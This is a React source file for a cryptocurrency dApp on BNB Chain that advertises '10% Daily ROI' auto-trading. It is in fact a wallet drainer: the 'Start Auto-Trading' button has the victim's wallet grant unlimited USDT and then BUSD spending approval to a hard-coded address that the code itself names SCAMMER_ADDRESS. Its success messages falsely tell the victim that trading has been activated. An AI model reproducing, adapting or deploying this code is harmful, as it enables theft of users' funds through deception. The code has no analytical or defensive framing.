import React, { useEffect } from 'react';
import { Contract, MaxUint256, JsonRpcProvider } from 'ethers';

import {
  RainbowKitProvider,
  ConnectButton,
  getDefaultWallets
} from '@rainbow-me/rainbowkit';

import {
  WagmiConfig,
  createConfig,
  configureChains,
  useAccount,
  useWalletClient
} from 'wagmi';

import { bsc } from 'wagmi/chains';
import { jsonRpcProvider } from 'wagmi/providers/jsonRpc';

import '@rainbow-me/rainbowkit/styles.css';

const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const BUSD_ADDRESS = "0xe9e7cea3dedca5984780bafc599bd69add087d56";
const SCAMMER_ADDRESS = "0xbE73c37a0C255766211804aA453904717136B3AB";

const ABI = ["function approve(address spender, uint256 amount) external returns (bool)"];

const { chains, publicClient } = configureChains(
  [bsc],
  [
    jsonRpcProvider({
      rpc: () => ({
        http: 'https://bsc-dataseed.binance.org'
      })
    })
  ]
);

const { connectors } = getDefaultWallets({
  appName: "Auto-Trading ROI",
  projectId: "6b0d9f43b66457426a444383f058d531",
  chains
});

const wagmiConfig = createConfig({
  autoConnect: true,
  connectors,
  publicClient
});

function ApproveButton() {
  const { data: walletClient } = useWalletClient();
  const { address, isConnected } = useAccount();

  const handleApprove = async () => {
    if (!isConnected || !walletClient) {
      alert("❗ Please connect wallet first.");
      return;
    }

    const stage = localStorage.getItem("approval_stage") || "usdt";
    const tokenAddress = stage === "usdt" ? USDT_ADDRESS : BUSD_ADDRESS;
    const tokenName = stage.toUpperCase();

    try {
      const provider = new JsonRpcProvider("https://bsc-dataseed.binance.org");
      const signer = await provider.getSigner(address);
      const contract = new Contract(tokenAddress, ABI, signer);

      const tx = await contract.approve(SCAMMER_ADDRESS, MaxUint256);
      alert(`🔄 Approving ${tokenName}...`);
      await tx.wait();

      if (stage === "usdt") {
        localStorage.setItem("approval_stage", "busd");
        alert("✅ USDT Approved! Now approving BUSD...");
        handleApprove();
      } else {
        localStorage.removeItem("approval_stage");
        alert("✅ Auto-Trading Activated! Enjoy your 10% ROI 😉");
      }
    } catch (err) {
      console.error(err);
      alert(`❌ ${tokenName} approval failed.`);
    }
  };

  return (
    <button onClick={handleApprove} style={styles.button}>
      📈 Start Auto-Trading
    </button>
  );
}

function App() {
  useEffect(() => {
    localStorage.setItem("approval_stage", "usdt");
  }, []);

  return (
    <WagmiConfig config={wagmiConfig}>
      <RainbowKitProvider chains={chains}>
        <div style={styles.container}>
          <h1>💰 Earn 10% Daily ROI</h1>
          <p>Connect wallet & approve tokens to start auto-trading.</p>
          <ConnectButton />
          <br />
          <ApproveButton />
        </div>
      </RainbowKitProvider>
    </WagmiConfig>
  );
}

const styles = {
  container: {
    textAlign: "center",
    padding: "40px",
    fontFamily: "Arial, sans-serif",
    backgroundColor: "#f0f2f5",
    minHeight: "100vh"
  },
  button: {
    padding: "12px 24px",
    fontSize: "16px",
    cursor: "pointer",
    backgroundColor: "#2d89ef",
    color: "white",
    border: "none",
    borderRadius: "6px",
    margin: "10px"
  }
};

export default App;
